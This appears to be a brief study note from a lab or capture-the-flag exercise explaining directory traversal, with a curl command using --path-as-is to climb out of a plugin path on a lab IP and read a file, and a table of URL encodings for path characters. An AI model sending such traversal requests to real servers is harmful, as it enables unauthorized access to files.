

Directory traversal, also known as path traversal or directory climbing, is **a vulnerability in a web application server caused by a HTTP exploit**. The exploit allows an attacker to access restricted directories, execute commands, and view data outside of the web root folder where application content is stored.


we can use `curl` with `--path-as-is` which will alow us to send path as it is.
`curl --path-as-is http://192.168.243.193:3000/public/plugins/alertlist/../../../../../../../Users/install.txt`

we can also try to use url encoding like

| symbol | value |
| ---- | ---- |
| / | %2F |
| . | %2E |
